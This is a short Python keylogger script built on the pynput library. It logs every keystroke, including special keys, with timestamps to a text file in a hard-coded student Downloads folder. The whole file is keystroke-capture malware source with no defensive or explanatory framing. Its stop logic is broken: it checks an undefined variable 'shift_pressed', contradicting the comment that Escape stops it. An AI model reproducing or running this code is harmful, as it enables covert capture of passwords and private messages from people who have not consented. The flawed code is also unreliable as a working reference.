import logging
from pynput import keyboard

# Set up logging to save the file in a specific directory
# Change the path to the directory where you want to save the file
logging.basicConfig(filename=r"C:\Users\acuk.student\Downloads\keystrokes.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")


# Function to handle key press events
def on_press(key):
    try:
        # If the key is a normal character key, log it
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # If it's a special key (like shift, spacebar, etc.), log it
        logging.info(f"Special key pressed: {key}")

# Function to stop the listener when the 'esc' key is pressed
def on_release(key):
    if key == keyboard.Key.esc and shift_pressed:
        # Stop the listener when the Escape key is pressed
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
